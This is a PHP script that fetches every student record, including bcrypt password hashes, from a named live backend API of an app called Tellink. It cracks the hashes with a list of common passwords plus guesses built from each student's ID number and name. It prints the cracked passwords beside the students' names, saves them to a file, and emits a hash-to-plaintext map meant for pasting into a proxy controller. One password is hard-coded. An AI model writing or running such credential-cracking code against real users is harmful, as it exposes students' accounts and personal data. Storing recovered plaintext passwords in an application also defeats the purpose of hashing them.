<?php

// Script untuk mencoba mendekripsi semua password dari API
// Run: php decrypt_all_passwords.php

echo "========================================\n";
echo "   TELLINK PASSWORD DECRYPTION TOOL    \n";
echo "========================================\n\n";

$baseUrl = 'https://tellink-backend-2-b916417fa9aa.herokuapp.com';

// Step 1: Get all users from API
echo "[1] Fetching all users from API...\n";
$ch = curl_init($baseUrl . '/api/mahasiswa');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode != 200) {
    die("Error: Failed to fetch users from API\n");
}

$data = json_decode($response, true);
$users = isset($data['data']) ? $data['data'] : [];
echo "   Found " . count($users) . " users\n\n";

// Common password patterns to test
$passwordPatterns = [
    '@AGBDlcid574',  // Known password
    'password',
    'password123',
    'Password123',
    'password@123',
    'Password@123',
    '123456',
    '12345678',
    '123456789',
    'admin',
    'admin123',
    'Admin123',
    'admin@123',
    'tellink',
    'tellink123',
    'Tellink123',
    'tellink@123',
    'Tellink@123',
    'mahasiswa',
    'mahasiswa123',
    'Mahasiswa123',
    'mahasiswa@123',
    'Mahasiswa@123',
    'student',
    'student123',
    'Student123',
    'default',
    'default123',
    'Default123',
    'user',
    'user123',
    'User123',
    'test',
    'test123',
    'Test123',
    'demo',
    'demo123',
    'Demo123',
    'qwerty',
    'qwerty123',
    '111111',
    '000000',
    'abc123',
    'letmein',
    'welcome',
    'welcome123',
    'Welcome123',
    'pass',
    'pass123',
    'Pass123',
];

// Add NIM-based passwords
foreach ($users as $user) {
    if (isset($user['nim'])) {
        $passwordPatterns[] = $user['nim'];
        $passwordPatterns[] = $user['nim'] . '123';
        $passwordPatterns[] = 'password' . $user['nim'];
    }
    if (isset($user['nama'])) {
        $nama = strtolower(str_replace(' ', '', $user['nama']));
        $passwordPatterns[] = $nama;
        $passwordPatterns[] = $nama . '123';
    }
}

// Remove duplicates
$passwordPatterns = array_unique($passwordPatterns);

echo "[2] Testing " . count($passwordPatterns) . " password patterns...\n\n";

$results = [];
$foundCount = 0;

foreach ($users as $index => $user) {
    if (!isset($user['password']) || !isset($user['nim'])) {
        continue;
    }
    
    $nim = $user['nim'];
    $nama = $user['nama'] ?? 'Unknown';
    $hash = $user['password'];
    
    echo "Testing user " . ($index + 1) . "/" . count($users) . ": $nama (NIM: $nim)\n";
    
    // Convert $2b$ to $2y$ for PHP compatibility
    $phpHash = str_replace('$2b$', '$2y$', $hash);
    
    $passwordFound = false;
    $foundPassword = '';
    
    // Test each password pattern
    foreach ($passwordPatterns as $testPassword) {
        if (password_verify($testPassword, $phpHash)) {
            $passwordFound = true;
            $foundPassword = $testPassword;
            $foundCount++;
            echo "   ✅ PASSWORD FOUND: '$testPassword'\n";
            break;
        }
    }
    
    if (!$passwordFound) {
        echo "   ❌ Password not found\n";
    }
    
    // Store result
    $results[] = [
        'nim' => $nim,
        'nama' => $nama,
        'hash' => $hash,
        'password' => $passwordFound ? $foundPassword : null,
        'found' => $passwordFound
    ];
    
    echo "\n";
}

// Step 3: Generate report
echo "========================================\n";
echo "            DECRYPTION RESULTS          \n";
echo "========================================\n\n";

echo "Summary:\n";
echo "- Total users: " . count($users) . "\n";
echo "- Passwords found: $foundCount\n";
echo "- Success rate: " . round(($foundCount / count($users)) * 100, 2) . "%\n\n";

// Create PHP array for controller
echo "PHP Array for Controller (copy this to TellinkProxyController.php):\n";
echo "----------------------------------------\n";
echo "\$knownPasswords = [\n";
foreach ($results as $result) {
    if ($result['found']) {
        echo "    '" . $result['hash'] . "' => '" . $result['password'] . "',\n";
    }
}
echo "];\n\n";

// Create detailed report
echo "Detailed Results:\n";
echo "----------------------------------------\n";
printf("%-15s %-30s %-20s %-15s\n", "NIM", "Name", "Password", "Status");
echo str_repeat("-", 80) . "\n";

foreach ($results as $result) {
    printf(
        "%-15s %-30s %-20s %-15s\n",
        $result['nim'],
        substr($result['nama'], 0, 30),
        $result['found'] ? $result['password'] : '???',
        $result['found'] ? '✅ Found' : '❌ Not Found'
    );
}

// Save results to file
$outputFile = 'decrypted_passwords.json';
file_put_contents($outputFile, json_encode($results, JSON_PRETTY_PRINT));
echo "\n\nResults saved to: $outputFile\n";

// Create update file for controller
$updateCode = "<?php\n\n// Add this to detectPlainPassword() method in TellinkProxyController.php\n\n";
$updateCode .= "\$knownPasswords = [\n";
foreach ($results as $result) {
    if ($result['found']) {
        $updateCode .= "    '" . $result['hash'] . "' => '" . $result['password'] . "',\n";
    }
}
$updateCode .= "];\n";

file_put_contents('password_mappings.php', $updateCode);
echo "Controller update code saved to: password_mappings.php\n";

echo "\n========================================\n";
echo "          DECRYPTION COMPLETE!          \n";
echo "========================================\n";
